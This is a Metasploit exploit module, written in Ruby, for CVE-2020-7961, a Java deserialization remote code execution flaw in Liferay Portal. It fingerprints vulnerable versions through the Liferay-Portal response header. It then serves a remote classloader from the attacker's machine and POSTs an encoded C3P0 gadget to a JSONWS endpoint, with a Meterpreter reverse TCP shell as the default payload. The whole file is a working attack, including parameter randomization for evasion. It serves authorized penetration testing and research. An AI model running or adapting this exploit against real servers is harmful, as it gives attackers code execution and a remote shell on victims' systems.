##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::Java::HTTP::ClassLoader

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Liferay Portal Java Unmarshalling via JSONWS RCE',
        'Description' => %q{
          This module exploits a Java unmarshalling vulnerability via JSONWS in
          Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, and 7.2.1
          GA2 to execute code as the Liferay user. Tested against 7.2.0 GA1.
        },
        'Author' => [
          'Markus Wulftange', # Discovery
          'Thomas Etrillard', # PoC
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-7961'],
          ['URL', 'https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html'],
          ['URL', 'https://www.synacktiv.com/posts/pentest/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html'],
          ['URL', 'https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271']
        ],
        'DisclosureDate' => '2019-11-25', # Vendor advisory
        'License' => MSF_LICENSE,
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Privileged' => false,
        'Targets' => [
          ['Liferay Portal < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, 7.2.1 GA2', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'PAYLOAD' => 'java/meterpreter/reverse_tcp'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def check
    # GET / response contains a Liferay-Portal header with version information
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    )

    unless res
      return CheckCode::Unknown('Target did not respond to check.')
    end

    unless res.headers['Liferay-Portal']
      return CheckCode::Unknown(
        'Target did not respond with Liferay-Portal header.'
      )
    end

    # Building the Liferay-Portal header:
    #   https://github.com/liferay/liferay-portal/blob/master/portal-kernel/src/com/liferay/portal/kernel/util/ReleaseInfo.java
    #
    # Liferay-Portal header data:
    #   https://github.com/liferay/liferay-portal/blob/master/release.properties
    #
    # Example GET / response:
    #   HTTP/1.1 200
    #   [snip]
    #   Liferay-Portal: Liferay Community Edition Portal 7.2.0 CE GA1 (Mueller / Build 7200 / June 4, 2019)
    #   [snip]
    version, build = res.headers['Liferay-Portal'].scan(
      /^Liferay.*Portal ([\d.]+.*GA\d+).*Build (\d+)/
    ).flatten

    unless version && build
      return CheckCode::Detected(
        'Target did not respond with Liferay version and build.'
      )
    end

    # XXX: Liferay versions older than 7.2.1 GA2 (build 7201) "may" be unpatched
    if build.to_i < 7201
      return CheckCode::Appears(
        "Liferay #{version} MAY be a vulnerable version. Please verify."
      )
    end

    CheckCode::Safe("Liferay #{version} is NOT a vulnerable version.")
  end

  def exploit
    # Start our HTTP server to provide remote classloading
    @classloader_uri = start_service

    unless @classloader_uri
      fail_with(Failure::BadConfig, 'Could not start remote classloader server')
    end

    print_good("Started remote classloader server at #{@classloader_uri}")

    # Send our remote classloader gadget to the target, triggering the vuln
    send_request_gadget(
      normalize_uri(target_uri.path, '/api/jsonws/expandocolumn/update-column'),
      # Required POST parameters for /api/jsonws/expandocolumn/update-column:
      # https://github.com/liferay/liferay-portal/blob/master/portal-impl/src/com/liferay/portlet/expando/service/impl/ExpandoColumnServiceImpl.java
      'columnId' => rand(8..42), # Randomize for "evasion"
      'name' => rand(8..42), # Randomize for "evasion"
      'type' => rand(8..42) # Randomize for "evasion"
    )
  end

  # Convenience method to send our gadget to a URI with desired POST params
  def send_request_gadget(uri, vars_post = {})
    print_status("Sending remote classloader gadget to #{full_uri(uri)}")

    vars_post['+defaultData'] =
      'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource'

    vars_post['defaultData.userOverridesAsString'] =
      "HexAsciiSerializedMap:#{go_go_gadget.unpack1('H*')};"

    send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'vars_post' => vars_post
    }, 0)
  end

  # Generate all marshalsec payloads for the Jackson marshaller:
  # java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson -a
  def go_go_gadget
    # Implementation of the Jackson marshaller's C3P0WrapperConnPool gadget:
    # https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/C3P0WrapperConnPool.java
    gadget = Rex::Text.decode_base64(
      <<~EOF
        rO0ABXNyAD1jb20ubWNoYW5nZS52Mi5uYW1pbmcuUmVmZXJlbmNlSW5kaXJlY3RvciRSZWZl
        cmVuY2VTZXJpYWxpemVkYhmF0NEqwhMCAARMAAtjb250ZXh0TmFtZXQAE0xqYXZheC9uYW1p
        bmcvTmFtZTtMAANlbnZ0ABVMamF2YS91dGlsL0hhc2h0YWJsZTtMAARuYW1lcQB+AAFMAAly
        ZWZlcmVuY2V0ABhMamF2YXgvbmFtaW5nL1JlZmVyZW5jZTt4cHBwcHNyABZqYXZheC5uYW1p
        bmcuUmVmZXJlbmNl6MaeoqjpjQkCAARMAAVhZGRyc3QAEkxqYXZhL3V0aWwvVmVjdG9yO0wA
        DGNsYXNzRmFjdG9yeXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAFGNsYXNzRmFjdG9yeUxvY2F0
        aW9ucQB+AAdMAAljbGFzc05hbWVxAH4AB3hwc3IAEGphdmEudXRpbC5WZWN0b3LZl31bgDuv
        AQMAA0kAEWNhcGFjaXR5SW5jcmVtZW50SQAMZWxlbWVudENvdW50WwALZWxlbWVudERhdGF0
        ABNbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAAAAAAAAHVyABNbTGphdmEubGFuZy5PYmplY3Q7
        kM5YnxBzKWwCAAB4cAAAAApwcHBwcHBwcHBweHQABEhBQ0t0AANUSEV0AAZQTEFORVQ=
      EOF
    )

    # Replace length-prefixed placeholder strings with our own
    gadget.sub!("\x00\x04HACK", packed_class_name)
    gadget.sub!("\x00\x03THE", packed_classloader_uri)
    gadget.sub("\x00\x06PLANET", packed_class_name)
  end

  # Convenience method to pack the classloader URI as a length-prefixed string
  def packed_classloader_uri
    "#{[@classloader_uri.length].pack('n')}#{@classloader_uri}"
  end

end
